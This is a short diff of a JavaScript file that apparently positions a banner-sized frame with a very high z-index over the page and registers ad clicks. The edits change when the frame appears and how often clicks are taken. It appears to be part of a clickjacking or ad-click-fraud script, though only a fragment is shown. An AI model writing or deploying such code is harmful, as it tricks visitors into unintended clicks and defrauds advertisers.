@@ -94,6 +94,9 @@ function setUrlFrame() {
 }
 
 function showFrame() {
+    Started = 1;
+    startTracker();
+
     $("#iplezier").css("top", "-110px").css("left", "-" + parseInt(clientWidth / 2 - 234) + "px").css("pointer-events", "");
     $("#guerejo").css("width", "468px").css("height", "60px").css("z-index", "999999").css("position", "absolute");
 }
@@ -105,16 +108,14 @@ function checkDelay() {
         if($cookie == '1'){
             setTimeout(minimizeFrame,1000);
         } else {
-            Started = 1;
-            startTracker();
-            setTimeout(showFrame,2000);
+            setTimeout(showFrame,5000);
         }
     }
 }
 
 function clickAds(){
     setCookie(cookieName, '1', 24 * 2);
-    setTimeout(nextClick,5000);
+    setTimeout(nextClick,120000);
     document.activeElement.blur();
 }
 
